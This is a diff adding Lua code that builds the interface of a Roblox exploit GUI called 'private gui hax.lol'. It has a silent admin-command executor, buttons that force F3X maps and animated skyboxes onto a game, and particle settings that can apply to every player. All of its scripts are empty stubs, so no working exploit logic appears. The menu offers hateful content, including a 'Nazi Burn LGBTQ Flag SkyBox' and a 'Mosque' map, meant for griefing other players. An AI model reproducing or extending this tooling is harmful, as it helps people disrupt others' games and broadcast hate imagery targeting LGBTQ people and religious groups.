+G2L["290"]["Name"] = [[ScrollSkyAnimate]];
+G2L["290"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["290"]["Size"] = UDim2.new(0, 318, 0, 152);
+G2L["290"]["Position"] = UDim2.new(0, 0, 0.62954, 0);
+G2L["290"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["290"]["ScrollBarThickness"] = 6;
+
+
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab Page.ScrollSkyAnimate.Button
+G2L["291"] = Instance.new("TextButton", G2L["290"]);
+G2L["291"]["TextWrapped"] = true;
+G2L["291"]["BorderSizePixel"] = 3;
+G2L["291"]["TextSize"] = 14;
+G2L["291"]["TextScaled"] = true;
+G2L["291"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["291"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["291"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["291"]["Size"] = UDim2.new(0, 90, 0, 34);
+G2L["291"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["291"]["Text"] = [[Empty]];
+G2L["291"]["Name"] = [[Button]];
+G2L["291"]["Position"] = UDim2.new(0.00125, 0, 0.00969, 0);
+
+
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab Page.ScrollSkyAnimate.Button.Button
+G2L["292"] = Instance.new("TextButton", G2L["291"]);
+G2L["292"]["TextWrapped"] = true;
+G2L["292"]["BorderSizePixel"] = 3;
+G2L["292"]["TextSize"] = 14;
+G2L["292"]["TextScaled"] = true;
+G2L["292"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["292"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["292"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["292"]["Size"] = UDim2.new(0, 90, 0, 34);
+G2L["292"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["292"]["Text"] = [[Idiot SkyBox]];
+G2L["292"]["Name"] = [[Button]];
+G2L["292"]["Position"] = UDim2.new(1.15665, 0, -0.01367, 0);
+
+
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab Page.ScrollSkyAnimate.Button.Button.LocalScript
+G2L["293"] = Instance.new("LocalScript", G2L["292"]);
+
+
+
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab Page.ScrollSkyAnimate.Button.Button
+G2L["294"] = Instance.new("TextButton", G2L["291"]);
+G2L["294"]["TextWrapped"] = true;
+G2L["294"]["BorderSizePixel"] = 3;
+G2L["294"]["TextSize"] = 14;
+G2L["294"]["TextScaled"] = true;
+G2L["294"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["294"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["294"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["294"]["Size"] = UDim2.new(0, 90, 0, 34);
+G2L["294"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["294"]["Text"] = [[Nyan Cat SkyBox]];
+G2L["294"]["Name"] = [[Button]];
+G2L["294"]["Position"] = UDim2.new(2.32332, 0, -0.01367, 0);
+
+
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab Page.ScrollSkyAnimate.Button.Button.LocalScript
+G2L["295"] = Instance.new("LocalScript", G2L["294"]);
+
+
+
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab Page.ScrollSkyAnimate.Button.Button
+G2L["296"] = Instance.new("TextButton", G2L["291"]);
+G2L["296"]["TextWrapped"] = true;
+G2L["296"]["BorderSizePixel"] = 3;
+G2L["296"]["TextSize"] = 14;
+G2L["296"]["TextScaled"] = true;
+G2L["296"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["296"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["296"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["296"]["Size"] = UDim2.new(0, 90, 0, 34);
+G2L["296"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["296"]["Text"] = [[Nazi Burn LGBTQ Flag SkyBox]];
+G2L["296"]["Name"] = [[Button]];
+G2L["296"]["Position"] = UDim2.new(0.0011, 0, 1.39809, 0);
+
+
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab Page.ScrollSkyAnimate.Button.Button.LocalScript
+G2L["297"] = Instance.new("LocalScript", G2L["296"]);
+
+
+
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab Page.ScrollSkyAnimate.Button.Button
+G2L["298"] = Instance.new("TextButton", G2L["291"]);
+G2L["298"]["TextWrapped"] = true;
+G2L["298"]["BorderSizePixel"] = 3;
+G2L["298"]["TextSize"] = 14;
+G2L["298"]["TextScaled"] = true;
+G2L["298"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["298"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["298"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["298"]["Size"] = UDim2.new(0, 90, 0, 34);
+G2L["298"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["298"]["Text"] = [[Rainbow Frog SkyBox]];
+G2L["298"]["Name"] = [[Button]];
+G2L["298"]["Position"] = UDim2.new(1.15665, 0, 1.39809, 0);
+
+
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab Page.ScrollSkyAnimate.Button.Button.LocalScript
+G2L["299"] = Instance.new("LocalScript", G2L["298"]);
+
+
+
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab Page.ScrollSkyAnimate.Button.Button
+G2L["29a"] = Instance.new("TextButton", G2L["291"]);
+G2L["29a"]["TextWrapped"] = true;
+G2L["29a"]["BorderSizePixel"] = 3;
+G2L["29a"]["TextSize"] = 14;
+G2L["29a"]["TextScaled"] = true;
+G2L["29a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["29a"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["29a"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["29a"]["Size"] = UDim2.new(0, 90, 0, 34);
+G2L["29a"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["29a"]["Text"] = [[Empty]];
+G2L["29a"]["Name"] = [[Button]];
+G2L["29a"]["Position"] = UDim2.new(2.32332, 0, 1.39809, 0);
+
+
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab Page.ScrollSkyAnimate.Button.LocalScript
+G2L["29b"] = Instance.new("LocalScript", G2L["291"]);
+
+
+
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab Page.TextLabel
+G2L["29c"] = Instance.new("TextLabel", G2L["28f"]);
+G2L["29c"]["TextWrapped"] = true;
+G2L["29c"]["BorderSizePixel"] = 3;
+G2L["29c"]["TextSize"] = 14;
+G2L["29c"]["TextScaled"] = true;
+G2L["29c"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["29c"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["29c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["29c"]["Size"] = UDim2.new(0, 318, 0, 26);
+G2L["29c"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["29c"]["Text"] = [[Silent HD CMD Executor]];
+G2L["29c"]["Position"] = UDim2.new(0, 0, 0, 0);
+
+
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab Page.TextLabel
+G2L["29d"] = Instance.new("TextLabel", G2L["28f"]);
+G2L["29d"]["TextWrapped"] = true;
+G2L["29d"]["BorderSizePixel"] = 3;
+G2L["29d"]["TextSize"] = 14;
+G2L["29d"]["TextScaled"] = true;
+G2L["29d"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["29d"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["29d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["29d"]["Size"] = UDim2.new(0, 318, 0, 28);
+G2L["29d"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["29d"]["Text"] = [[Animated HD F3X Skyboxes (Credited to 1sw0rd1 For Decals of It)]];
+G2L["29d"]["Position"] = UDim2.new(0, 0, 0.5569, 0);
+
+
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab Page.ExecuteBTN
+G2L["29e"] = Instance.new("TextButton", G2L["28f"]);
+G2L["29e"]["TextWrapped"] = true;
+G2L["29e"]["BorderSizePixel"] = 3;
+G2L["29e"]["TextSize"] = 14;
+G2L["29e"]["TextScaled"] = true;
+G2L["29e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["29e"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["29e"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["29e"]["Size"] = UDim2.new(0, 90, 0, 31);
+G2L["29e"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["29e"]["Text"] = [[Send CMD]];
+G2L["29e"]["Name"] = [[ExecuteBTN]];
+G2L["29e"]["Position"] = UDim2.new(0.0125, 0, 0.10654, 0);
+
+
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab Page.ExecuteBTN.LocalScript
+G2L["29f"] = Instance.new("LocalScript", G2L["29e"]);
+
+
+
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab Page.TextBoxCMD
+G2L["2a0"] = Instance.new("TextBox", G2L["28f"]);
+G2L["2a0"]["Name"] = [[TextBoxCMD]];
+G2L["2a0"]["PlaceholderColor3"] = Color3.fromRGB(164, 164, 164);
+G2L["2a0"]["BorderSizePixel"] = 3;
+G2L["2a0"]["TextWrapped"] = true;
+G2L["2a0"]["TextSize"] = 14;
+G2L["2a0"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2a0"]["TextScaled"] = true;
+G2L["2a0"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2a0"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2a0"]["PlaceholderText"] = [[;example]];
+G2L["2a0"]["Size"] = UDim2.new(0, 187, 0, 34);
+G2L["2a0"]["Position"] = UDim2.new(0.18906, 0, 0.09927, 0);
+G2L["2a0"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["2a0"]["Text"] = [[]];
+
+
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab Page.TextLabel
+G2L["2a1"] = Instance.new("TextLabel", G2L["28f"]);
+G2L["2a1"]["TextWrapped"] = true;
+G2L["2a1"]["BorderSizePixel"] = 3;
+G2L["2a1"]["TextSize"] = 14;
+G2L["2a1"]["TextScaled"] = true;
+G2L["2a1"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2a1"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2a1"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2a1"]["Size"] = UDim2.new(0, 318, 0, 26);
+G2L["2a1"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["2a1"]["Text"] = [[F3X Maps]];
+G2L["2a1"]["Position"] = UDim2.new(0, 0, 0.22276, 0);
+
+
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab Page.ScrollMap
+G2L["2a2"] = Instance.new("ScrollingFrame", G2L["28f"]);
+G2L["2a2"]["Active"] = true;
+G2L["2a2"]["BorderSizePixel"] = 3;
+G2L["2a2"]["Name"] = [[ScrollMap]];
+G2L["2a2"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2a2"]["Size"] = UDim2.new(0, 318, 0, 104);
+G2L["2a2"]["Position"] = UDim2.new(0, 0, 0.28571, 0);
+G2L["2a2"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["2a2"]["ScrollBarThickness"] = 6;
+
+
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab Page.ScrollMap.Button
+G2L["2a3"] = Instance.new("TextButton", G2L["2a2"]);
+G2L["2a3"]["TextWrapped"] = true;
+G2L["2a3"]["BorderSizePixel"] = 3;
+G2L["2a3"]["TextSize"] = 14;
+G2L["2a3"]["TextScaled"] = true;
+G2L["2a3"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2a3"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2a3"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2a3"]["Size"] = UDim2.new(0, 90, 0, 34);
+G2L["2a3"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["2a3"]["Text"] = [[Work At Pizza Place]];
+G2L["2a3"]["Name"] = [[Button]];
+G2L["2a3"]["Position"] = UDim2.new(0.00125, 0, 0.0109, 0);
+
+
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab Page.ScrollMap.Button.Button
+G2L["2a4"] = Instance.new("TextButton", G2L["2a3"]);
+G2L["2a4"]["TextWrapped"] = true;
+G2L["2a4"]["BorderSizePixel"] = 3;
+G2L["2a4"]["TextSize"] = 14;
+G2L["2a4"]["TextScaled"] = true;
+G2L["2a4"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2a4"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2a4"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2a4"]["Size"] = UDim2.new(0, 90, 0, 34);
+G2L["2a4"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["2a4"]["Text"] = [[Fencing Map]];
+G2L["2a4"]["Name"] = [[Button]];
+G2L["2a4"]["Position"] = UDim2.new(1.15665, 0, -0.01367, 0);
+
+
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab Page.ScrollMap.Button.Button.LocalScript
+G2L["2a5"] = Instance.new("LocalScript", G2L["2a4"]);
+
+
+
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab Page.ScrollMap.Button.Button
+G2L["2a6"] = Instance.new("TextButton", G2L["2a3"]);
+G2L["2a6"]["TextWrapped"] = true;
+G2L["2a6"]["BorderSizePixel"] = 3;
+G2L["2a6"]["TextSize"] = 14;
+G2L["2a6"]["TextScaled"] = true;
+G2L["2a6"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2a6"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2a6"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2a6"]["Size"] = UDim2.new(0, 90, 0, 34);
+G2L["2a6"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["2a6"]["Text"] = [[Elv4r0x's Realm]];
+G2L["2a6"]["Name"] = [[Button]];
+G2L["2a6"]["Position"] = UDim2.new(2.32332, 0, -0.01367, 0);
+
+
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab Page.ScrollMap.Button.Button.LocalScript
+G2L["2a7"] = Instance.new("LocalScript", G2L["2a6"]);
+
+
+
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab Page.ScrollMap.Button.Button
+G2L["2a8"] = Instance.new("TextButton", G2L["2a3"]);
+G2L["2a8"]["TextWrapped"] = true;
+G2L["2a8"]["BorderSizePixel"] = 3;
+G2L["2a8"]["TextSize"] = 14;
+G2L["2a8"]["TextScaled"] = true;
+G2L["2a8"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2a8"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2a8"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2a8"]["Size"] = UDim2.new(0, 90, 0, 34);
+G2L["2a8"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["2a8"]["Text"] = [[k00pkidd's Realm]];
+G2L["2a8"]["Name"] = [[Button]];
+G2L["2a8"]["Position"] = UDim2.new(0.0011, 0, 1.39809, 0);
+
+
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab Page.ScrollMap.Button.Button.LocalScript
+G2L["2a9"] = Instance.new("LocalScript", G2L["2a8"]);
+
+
+
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab Page.ScrollMap.Button.Button
+G2L["2aa"] = Instance.new("TextButton", G2L["2a3"]);
+G2L["2aa"]["TextWrapped"] = true;
+G2L["2aa"]["BorderSizePixel"] = 3;
+G2L["2aa"]["TextSize"] = 14;
+G2L["2aa"]["TextScaled"] = true;
+G2L["2aa"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2aa"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2aa"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2aa"]["Size"] = UDim2.new(0, 90, 0, 34);
+G2L["2aa"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["2aa"]["Text"] = [[Skyl0rd's Realm]];
+G2L["2aa"]["Name"] = [[Button]];
+G2L["2aa"]["Position"] = UDim2.new(1.15665, 0, 1.39809, 0);
+
+
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab Page.ScrollMap.Button.Button.LocalScript
+G2L["2ab"] = Instance.new("LocalScript", G2L["2aa"]);
+
+
+
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab Page.ScrollMap.Button.Button
+G2L["2ac"] = Instance.new("TextButton", G2L["2a3"]);
+G2L["2ac"]["TextWrapped"] = true;
+G2L["2ac"]["BorderSizePixel"] = 3;
+G2L["2ac"]["TextSize"] = 14;
+G2L["2ac"]["TextScaled"] = true;
+G2L["2ac"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2ac"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2ac"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2ac"]["Size"] = UDim2.new(0, 90, 0, 34);
+G2L["2ac"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["2ac"]["Text"] = [[Roadblock's Mosque]];
+G2L["2ac"]["Name"] = [[Button]];
+G2L["2ac"]["Position"] = UDim2.new(2.32332, 0, 1.39809, 0);
+
+
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab Page.ScrollMap.Button.Button.LocalScript
+G2L["2ad"] = Instance.new("LocalScript", G2L["2ac"]);
+
+
+
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab Page.ScrollMap.Button.LocalScript
+G2L["2ae"] = Instance.new("LocalScript", G2L["2a3"]);
+
+
+
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab Page.ScrollMap.Button.Button
+G2L["2af"] = Instance.new("TextButton", G2L["2a3"]);
+G2L["2af"]["TextWrapped"] = true;
+G2L["2af"]["BorderSizePixel"] = 3;
+G2L["2af"]["TextSize"] = 14;
+G2L["2af"]["TextScaled"] = true;
+G2L["2af"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2af"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2af"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2af"]["Size"] = UDim2.new(0, 90, 0, 33);
+G2L["2af"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["2af"]["Text"] = [[Blue2Durham's Realm]];
+G2L["2af"]["Name"] = [[Button]];
+G2L["2af"]["Position"] = UDim2.new(0.0011, 0, 2.79412, 0);
+
+
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab Page.ScrollMap.Button.Button.LocalScript
+G2L["2b0"] = Instance.new("LocalScript", G2L["2af"]);
+
+
+
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab Page.ScrollMap.Button.Button
+G2L["2b1"] = Instance.new("TextButton", G2L["2a3"]);
+G2L["2b1"]["TextWrapped"] = true;
+G2L["2b1"]["BorderSizePixel"] = 3;
+G2L["2b1"]["TextSize"] = 14;
+G2L["2b1"]["TextScaled"] = true;
+G2L["2b1"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2b1"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2b1"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2b1"]["Size"] = UDim2.new(0, 90, 0, 33);
+G2L["2b1"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["2b1"]["Text"] = [[Empty]];
+G2L["2b1"]["Name"] = [[Button]];
+G2L["2b1"]["Position"] = UDim2.new(1.15665, 0, 2.79412, 0);
+
+
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab Page.ScrollMap.Button.Button
+G2L["2b2"] = Instance.new("TextButton", G2L["2a3"]);
+G2L["2b2"]["TextWrapped"] = true;
+G2L["2b2"]["BorderSizePixel"] = 3;
+G2L["2b2"]["TextSize"] = 14;
+G2L["2b2"]["TextScaled"] = true;
+G2L["2b2"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2b2"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2b2"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2b2"]["Size"] = UDim2.new(0, 90, 0, 33);
+G2L["2b2"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["2b2"]["Text"] = [[Empty]];
+G2L["2b2"]["Name"] = [[Button]];
+G2L["2b2"]["Position"] = UDim2.new(2.32332, 0, 2.79412, 0);
+
+
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab Page.Set Particle Self
+G2L["2b3"] = Instance.new("TextButton", G2L["28f"]);
+G2L["2b3"]["TextWrapped"] = true;
+G2L["2b3"]["BorderSizePixel"] = 3;
+G2L["2b3"]["TextSize"] = 14;
+G2L["2b3"]["TextScaled"] = true;
+G2L["2b3"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2b3"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2b3"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2b3"]["Size"] = UDim2.new(0, 66, 0, 31);
+G2L["2b3"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["2b3"]["Text"] = [[Set Particles Self]];
+G2L["2b3"]["Name"] = [[Set Particle Self]];
+G2L["2b3"]["Position"] = UDim2.new(0.51814, 0, 0.10488, 0);
+
+
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab Page.Set Particle Self.LocalScript
+G2L["2b4"] = Instance.new("LocalScript", G2L["2b3"]);
+
+
+
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab Page.TextLabel
+G2L["2b5"] = Instance.new("TextLabel", G2L["28f"]);
+G2L["2b5"]["TextWrapped"] = true;
+G2L["2b5"]["BorderSizePixel"] = 3;
+G2L["2b5"]["TextSize"] = 14;
+G2L["2b5"]["TextScaled"] = true;
+G2L["2b5"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2b5"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2b5"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2b5"]["Size"] = UDim2.new(0, 318, 0, 26);
+G2L["2b5"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["2b5"]["Text"] = [[F3X Particles Section]];
+G2L["2b5"]["Position"] = UDim2.new(0.50156, 0, 0, 0);
+
+
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab Page.Set Particle All
+G2L["2b6"] = Instance.new("TextButton", G2L["28f"]);
+G2L["2b6"]["TextWrapped"] = true;
+G2L["2b6"]["BorderSizePixel"] = 3;
+G2L["2b6"]["TextSize"] = 14;
+G2L["2b6"]["TextScaled"] = true;
+G2L["2b6"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2b6"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2b6"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2b6"]["Size"] = UDim2.new(0, 66, 0, 30);
+G2L["2b6"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["2b6"]["Text"] = [[Set Particles All]];
+G2L["2b6"]["Name"] = [[Set Particle All]];
+G2L["2b6"]["Position"] = UDim2.new(0.51814, 0, 0.21141, 0);
+
+
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab Page.Set Particle All.LocalScript
+G2L["2b7"] = Instance.new("LocalScript", G2L["2b6"]);
+
+
+
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab Page.particletextbox
+G2L["2b8"] = Instance.new("TextBox", G2L["28f"]);
+G2L["2b8"]["Name"] = [[particletextbox]];
+G2L["2b8"]["BorderSizePixel"] = 3;
+G2L["2b8"]["TextWrapped"] = true;
+G2L["2b8"]["TextSize"] = 14;
+G2L["2b8"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2b8"]["TextScaled"] = true;
+G2L["2b8"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2b8"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2b8"]["PlaceholderText"] = [[-- Decal ID]];
+G2L["2b8"]["Size"] = UDim2.new(0, 213, 0, 26);
+G2L["2b8"]["Position"] = UDim2.new(0.65, 0, 0.26392, 0);
+G2L["2b8"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["2b8"]["Text"] = [[]];
+
+
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab Page.imagehax
+G2L["2b9"] = Instance.new("ImageLabel", G2L["28f"]);
+G2L["2b9"]["BorderSizePixel"] = 3;
+G2L["2b9"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2b9"]["Size"] = UDim2.new(0, 70, 0, 57);
+G2L["2b9"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["2b9"]["Name"] = [[imagehax]];
+G2L["2b9"]["Position"] = UDim2.new(0.75504, 0, 0.0954, 0);
+
+
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab Page.imagehax.LocalScript
+G2L["2ba"] = Instance.new("LocalScript", G2L["2b9"]);
+
+
+
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab Page.sizetextbox
+G2L["2bb"] = Instance.new("TextBox", G2L["28f"]);
+G2L["2bb"]["Name"] = [[sizetextbox]];
+G2L["2bb"]["BorderSizePixel"] = 3;
+G2L["2bb"]["TextWrapped"] = true;
+G2L["2bb"]["TextSize"] = 14;
+G2L["2bb"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2bb"]["TextScaled"] = true;
+G2L["2bb"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2bb"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2bb"]["PlaceholderText"] = [[-- Size Particle]];
+G2L["2bb"]["Size"] = UDim2.new(0, 213, 0, 26);
+G2L["2bb"]["Position"] = UDim2.new(0.64844, 0, 0.35835, 0);
+G2L["2bb"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["2bb"]["Text"] = [[3,3,0.01]];
+
+
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab Page.velocitytextbox
+G2L["2bc"] = Instance.new("TextBox", G2L["28f"]);
+G2L["2bc"]["Name"] = [[velocitytextbox]];
+G2L["2bc"]["BorderSizePixel"] = 3;
+G2L["2bc"]["TextWrapped"] = true;
+G2L["2bc"]["TextSize"] = 14;
+G2L["2bc"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2bc"]["TextScaled"] = true;
+G2L["2bc"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2bc"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2bc"]["PlaceholderText"] = [[-- Velocity Speedness]];
+G2L["2bc"]["Size"] = UDim2.new(0, 213, 0, 26);
